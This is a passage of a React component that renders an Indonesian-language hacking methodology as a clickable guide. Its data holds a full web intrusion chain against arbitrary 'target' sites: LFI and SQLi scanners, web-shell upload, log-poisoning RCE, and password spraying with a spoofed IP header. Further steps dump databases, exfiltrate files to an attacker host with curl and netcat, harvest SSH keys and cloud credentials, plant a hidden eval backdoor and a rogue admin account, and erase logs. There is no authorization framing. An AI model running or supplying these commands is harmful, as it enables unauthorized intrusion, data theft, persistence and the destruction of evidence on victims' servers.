          { lang: "bash", code: `# Deteksi
curl -sI "https://target.com/" | grep -qi 'laravel_session' && echo "LARAVEL"

# Debug mode check
curl -s "https://target.com/testnonexistent123"
# Dapat error Whoops! → debug mode ON 🚀

# .env
curl -s "https://target.com/.env" | grep -E 'DB_|APP_KEY|MAIL_|AWS_'

# Telescope (debug toolbar)
curl -sI "https://target.com/telescope" -o /dev/null -w "%{http_code}\\n"` },
        ]
      },
      {
        id: "g2.3", title: "2.3 — React / Vue / SPA",
        blocks: [
          { lang: "bash", code: `# Cari API endpoints dari JS bundle
curl -s "https://target.com/" | grep -oP '"\/api\/[^"]*"' | sort -u

# GraphQL
curl -s "https://target.com/graphql" -o /dev/null -w "GraphQL: %{http_code}\\n"

# Swagger/OpenAPI
curl -s "https://target.com/swagger" -o /dev/null -w "Swagger: %{http_code}\\n"
curl -s "https://target.com/api/docs" -o /dev/null -w "API Docs: %{http_code}\\n"` },
        ]
      },
      {
        id: "g2.4", title: "2.4 — PHP Native / Custom CMS",
        blocks: [
          { lang: "bash — LFI scan semua parameter", code: `for param in page mod halaman menu konten berita artikel file \
  include template view content section action act; do
  result=$(curl -s "https://target.com/?\${param}=../../../etc/passwd")
  if echo "$result" | grep -q "root:"; then
    echo "LFI: \${param} 🚀"
  fi
done` },
          { lang: "bash — SQLi time-based scan", code: `for param in id kategori id_berita id_produk id_user; do
  t1=$(curl -s "https://target.com/?\${param}=1" -o /dev/null -w "%{time_total}")
  t2=$(curl -s "https://target.com/?\${param}=1' AND SLEEP(3)-- -" -o /dev/null -w "%{time_total}")
  if (( $(echo "$t2 > $t1 + 2" | bc -l) )); then
    echo "SQLi: \${param} 🚀"
  fi
done` },
        ]
      },
    ]
  },
  {
    id: "g3", label: "Vuln Priority", badge: "Phase 3", color: "bg-zinc-800 text-zinc-300",
    sections: [
      {
        id: "g3.0", title: "3.0 — Priority Matrix",
        text: `PRIORITY 1 — RCE in < 3 langkah:
  ⚡ Unauthenticated File Upload → Upload shell → RCE
  ⚡ SQLi (error/time-based) → Dump admin creds → Login → RCE
  ⚡ LFI + Log Poisoning → RCE via Apache log
  ⚡ PHP Deserialization → RCE

PRIORITY 2 — Butuh sedikit usaha:
  ⚡ Directory listing + file sensitif → Dapat DB creds
  ⚡ User enum + password spraying → Login → RCE via upload
  ⚡ Debug mode (Laravel/Django) → Dapat APP_KEY → RCE
  ⚡ Stored XSS → Curi session admin → Akses admin panel

PRIORITY 3 — Info Disclosure (bukan RCE langsung):
  ⚡ phpinfo → Path, config, kombinasi dengan LFI
  ⚡ .env bocor → DB creds, API keys
  ⚡ Backup SQL → Full database access
  ⚡ Version disclosure → Cari CVE sesuai versi`,
      },
      {
        id: "g3.1", title: "3.1 — Decision Flowchart",
        text: `START → Ada parameter GET?
  YA  → Test SQLi + LFI
  TIDAK ↓
Ada form upload?
  YA  → Upload shell.php
  TIDAK ↓
Ada login page?
  YA  → Spray default creds + user enum
  TIDAK ↓
Ada directory listing?
  YA  → Cari file sensitif (sql, bak, env, wp-config)
  TIDAK ↓
Ada versi CMS?
  YA  → Cari CVE public → Exploit
  TIDAK ↓
Ganti target (terlalu keras)`,
      },
    ]
  },
  {
    id: "g4", label: "Exploit Chain", badge: "Phase 4", color: "bg-zinc-800 text-zinc-300",
    sections: [
      {
        id: "g4.1", title: "4.1 — File Upload → RCE",
        blocks: [
          { lang: "bash", code: `# Cari endpoint upload
for path in upload upload.php file-upload uploader file uploads/files \
  api/upload admin/upload; do
  code=$(curl -sI "https://target.com/$path" -o /dev/null -w "%{http_code}")
  echo "[\${code}] $path"
done

# Upload shell
curl -s "https://target.com/upload.php" -F "file=@shell.php"

# Akses
curl "https://target.com/uploads/shell.php?c=id"` },
        ]
      },
      {
        id: "g4.2", title: "4.2 — SQLi → Dump Creds",
        blocks: [
          { lang: "bash", code: `# Konfirmasi SQLi
sqlmap -u "https://target.com/?id=1" --batch --level=3 --risk=2

# Dump users
sqlmap -u "https://target.com/?id=1" --batch -T users --dump

# Crack hash
john --wordlist=rockyou.txt hash.txt` },
        ]
      },
      {
        id: "g4.3", title: "4.3 — LFI → RCE (Log Poisoning)",
        blocks: [
          { lang: "bash", code: `# Step 1: Confirm LFI
curl "https://target.com/?file=../../../etc/passwd"
# root:x:0:0:root → CONFIRMED

# Step 2: Inject PHP ke Apache log
curl -s "https://target.com/" -H 'User-Agent: <?php system($_GET["c"]); ?>'

# Step 3: Include log + RCE
curl "https://target.com/?file=../../../../var/log/apache2/access.log&c=id"

# Alternatif: data:// wrapper
curl "https://target.com/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"` },
        ]
      },
      {
        id: "g4.4", title: "4.4 — Password Spraying",
        blocks: [
          { lang: "bash", code: `for user in admin administrator root test user demo; do
  for pass in admin 123456 password admin123 password123 \
    $(date +%Y) $(date +%Y)admin \${user}123 \${user}@123; do
    result=$(curl -s "https://target.com/login" \
      -H "X-Forwarded-For: 10.\${RANDOM}.\${RANDOM}.\${RANDOM}" \
      --data "username=\${user}&password=\${pass}")
    if ! echo "$result" | grep -q "incorrect\\|invalid\\|error"; then
      echo "SUCCESS: \${user}:\${pass}"
    fi
  done
done` },
        ]
      },
    ]
  },
  {
    id: "g5", label: "Post-Exploit", badge: "Phase 5", color: "bg-zinc-800 text-zinc-300",
    sections: [
      {
        id: "g5.1", title: "5.1 — Enumeration Cepat (5 Command)",
        blocks: [
          { lang: "bash", code: `whoami; id
uname -a; cat /etc/os-release
ls -la /var/www/html/
find /var/www -name "*.env" -o -name "wp-config.php" -o -name "config.php" -o -name "database.yml" 2>/dev/null
ss -tlnp; ip a` },
        ]
      },
      {
        id: "g5.2", title: "5.2 — Cari DB Credentials",
        blocks: [
          { lang: "bash", code: `grep -r -l "password\\|DB_PASSWORD" /var/www/ 2>/dev/null | head -10
grep -r "DB_HOST\\|DB_NAME\\|DB_USER\\|DB_PASSWORD" /var/www/ 2>/dev/null
grep -r "mysql:\\/\\/\\|pgsql:\\/\\/" /var/www/ 2>/dev/null` },
        ]
      },
      {
        id: "g5.3", title: "5.3 — Dump Database",
        blocks: [
          { lang: "bash", code: `# Full dump semua database
mysqldump -u "$DB_USER" -p"$DB_PASS" -h "$DB_HOST" --all-databases > /tmp/full_dump.sql
PGPASSWORD="$DB_PASS" pg_dump -h "$DB_HOST" -U "$DB_USER" -d "$DB_NAME" > /tmp/dump.sql` },
          { lang: "sql — ekstrak per CMS", code: `-- WordPress
SELECT user_login, user_email, user_pass FROM wp_users;
SELECT option_name, option_value FROM wp_options WHERE option_name LIKE '%api%key%';

-- Laravel
SELECT id, name, email, password FROM users;
SELECT * FROM personal_access_tokens;

-- Django
SELECT id, username, email, password, is_staff FROM auth_user;

-- Custom
SELECT * FROM admin; SELECT * FROM tbl_user;` },
        ]
      },
      {
        id: "g5.4", title: "5.4 — Privilege Escalation",
        blocks: [
          { lang: "bash", code: `sudo -l
find / -perm -4000 -type f 2>/dev/null | xargs -I{} ls -la {}
uname -r    # cek exploit-db untuk CVE kernel
cat /etc/crontab; ls -la /etc/cron.d/ 2>/dev/null` },
        ]
      },
      {
        id: "g5.5", title: "5.5 — Exfiltrasi Data",
        blocks: [
          { lang: "bash", code: `tar czf /tmp/exfil.tar.gz \
  /tmp/full_dump.sql \
  /var/www/html/wp-config.php \
  /var/www/html/.env \
  /var/log/apache2/access.log \
  2>/dev/null

# Via curl
curl -F "file=@/tmp/exfil.tar.gz" http://YOUR_IP:8080/upload

# Via netcat
nc YOUR_IP 8888 < /tmp/exfil.tar.gz` },
        ]
      },
    ]
  },
  {
    id: "g6", label: "Pivoting", badge: "Phase 6", color: "bg-zinc-800 text-zinc-300",
    sections: [
      {
        id: "g6.1", title: "6.1 — Baca Config Hosting",
        blocks: [
          { lang: "bash", code: `# Apache — semua virtual host
grep -r "ServerName\\|ServerAlias\\|DocumentRoot" /etc/apache2/sites-enabled/ 2>/dev/null
grep -r "ServerName\\|ServerAlias\\|DocumentRoot" /etc/httpd/conf.d/ 2>/dev/null

# nginx
grep -r "server_name" /etc/nginx/sites-enabled/ 2>/dev/null
grep -r "server_name" /etc/nginx/conf.d/ 2>/dev/null` },
        ]
      },
      {
        id: "g6.2", title: "6.2 — Akses Website Lain di Server Sama",
        blocks: [
          { lang: "bash", code: `for site_path in /var/www/*/wp-config.php; do
  echo "=== $site_path ==="
  grep -E 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST' "$site_path"
done` },
        ]
      },
      {
        id: "g6.3", title: "6.3 — Cari SSH Keys & Cloud Creds",
        blocks: [
          { lang: "bash", code: `# SSH keys
find /home /root -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# API keys (cloud)
grep -r "AWS_ACCESS_KEY\\|AZURE\\|GCP\\|api_key" /var/www/ 2>/dev/null

# Hosting panel
cat /etc/psa/.psa.shadow 2>/dev/null     # Plesk
cat /usr/local/cpanel/cpsess* 2>/dev/null # cPanel` },
        ]
      },
    ]
  },
  {
    id: "g7", label: "Persistence", badge: "Phase 7", color: "bg-zinc-800 text-zinc-300",
    sections: [
      {
        id: "g7.1", title: "7.1 — Backdoor Cepat",
        blocks: [
          { lang: "bash", code: `# Web shell tersembunyi di file valid
echo "<?php /*\${RANDOM}*/ @eval(\\$_POST['x']);/*\${RANDOM}*/ ?>" >> /var/www/html/wp-content/themes/active-theme/footer.php` },
          { lang: "sql — admin user cadangan (WP)", code: `INSERT INTO wp_users (user_login, user_pass, user_email, user_registered)
VALUES ('backup_admin', MD5('ComplexP@ss!'), 'backup@mail.com', NOW());
SET @uid = LAST_INSERT_ID();
INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (@uid, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');` },
        ]
      },
      {
        id: "g7.2", title: "7.2 — Hapus Jejak",
        blocks: [
          { lang: "bash", code: `# Hapus shell
find /var/www -name "shell.*" -o -name "backdoor.*" -exec rm -f {} \\; 2>/dev/null

# Bersihkan log
sed -i "/YOUR_IP/d" /var/log/apache2/access.log 2>/dev/null
sed -i "/shell.php/d" /var/log/apache2/access.log 2>/dev/null

# Hapus history
cat /dev/null > ~/.bash_history
cat /dev/null > ~/.mysql_history
rm -rf /tmp/full_dump.sql /tmp/exfil.tar.gz 2>/dev/null` },
        ]
      },
      {
        id: "g7.3", title: "7.3 — Quick Reference One-Liner",
        text: `FASE 0: SELECTION  — Google Dork: ext:sql "INSERT INTO" "password"
FASE 1: RECON      — curl -s target.com | grep -oP 'wp-content/plugins/[^/"]+'
FASE 2: ENUM       — curl -s target.com/wp-json/wp/v2/users
FASE 3: VULN       — curl "target.com/?id=1' AND SLEEP(3)-- -"
FASE 4: EXPLOIT    — sqlmap -u "target.com/?id=1" --batch --dump
FASE 5: POST-EXP   — grep -r "DB_PASSWORD" /var/www/ 2>/dev/null
FASE 6: PIVOT      — grep -r "ServerName" /etc/apache2/sites-enabled/
FASE 7: PERSIST    — echo '<?php @eval($_POST["x"]);?>' >> footer.php`,
      },
    ]
  },
];

// ---- main component ----
export function MethodologyTool() {
  const [activePhase, setActivePhase]   = useState("p1");
  const [activeGeneral, setActiveGeneral] = useState("g0");
  const [view, setView] = useState<"phases" | "general" | "cheatsheet">("phases");

  const phase   = PHASES.find((p) => p.id === activePhase);
  const general = GENERAL_PHASES.find((p) => p.id === activeGeneral);

  const tabs: { id: typeof view; label: string }[] = [
    { id: "phases",     label: "Exploit Chain" },
    { id: "general",    label: "General Methodology" },
    { id: "cheatsheet", label: "Cheat Sheet" },
  ];

  function PhaseNav({ phases, active, onSelect }: {
    phases: Phase[];
    active: string;
    onSelect: (id: string) => void;
  }) {
    return (
      <div className="flex flex-col gap-0.5 min-w-[120px]">
        {phases.map((p) => (
          <button
            key={p.id}
            onClick={() => onSelect(p.id)}
            className={`flex items-center gap-2 rounded px-2.5 py-1.5 text-left text-xs transition-colors border-l-2 ${
              active === p.id
                ? "border-l-fuchsia-500 bg-zinc-800 text-zinc-100"
                : "border-l-transparent text-zinc-500 hover:text-zinc-300 hover:bg-zinc-800"
            }`}
          >
            <span className="rounded bg-zinc-700 px-1 py-0.5 text-[10px] font-bold text-zinc-400">
              {p.badge.split(" ")[1]}
            </span>
            {p.label}
          </button>
        ))}
      </div>
    );
  }

  return (
    <div className="flex flex-col gap-3">
      {/* View toggle */}
      <div className="flex gap-1.5 border-b border-zinc-800 pb-2.5">
        {tabs.map((t) => (
          <button
            key={t.id}
            onClick={() => setView(t.id)}
            className={`rounded px-3 py-1.5 text-xs font-medium transition-colors ${
              view === t.id
                ? "bg-fuchsia-700 text-white"
                : "bg-zinc-800 text-zinc-500 border border-zinc-700 hover:bg-zinc-700"
            }`}
          >
            {t.label}
          </button>
        ))}
      </div>

      {view === "cheatsheet" ? (
        <CheatSheet />
      ) : view === "general" ? (
        <div className="flex gap-4">
          <PhaseNav phases={GENERAL_PHASES} active={activeGeneral} onSelect={setActiveGeneral} />
          <div className="flex-1 space-y-1.5 min-w-0">
            <div className="flex items-center gap-2 mb-2">
              <span className="rounded bg-zinc-800 border border-zinc-700 px-1.5 py-0.5 text-[10px] font-bold text-zinc-400">
                {general?.badge}
              </span>
              <h3 className="text-xs font-semibold text-zinc-300">{general?.label}</h3>
            </div>
            {general?.sections.map((s) => (
              <SectionBlock key={s.id} s={s} />
            ))}
          </div>
        </div>
      ) : (
        <div className="flex gap-4">
          <PhaseNav phases={PHASES} active={activePhase} onSelect={setActivePhase} />
          <div className="flex-1 space-y-1.5 min-w-0">
            <div className="flex items-center gap-2 mb-2">
              <span className="rounded bg-zinc-800 border border-zinc-700 px-1.5 py-0.5 text-[10px] font-bold text-zinc-400">
                {phase?.badge}
              </span>
              <h3 className="text-xs font-semibold text-zinc-300">{phase?.label}</h3>
            </div>
            {phase?.sections.map((s) => (
              <SectionBlock key={s.id} s={s} />
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
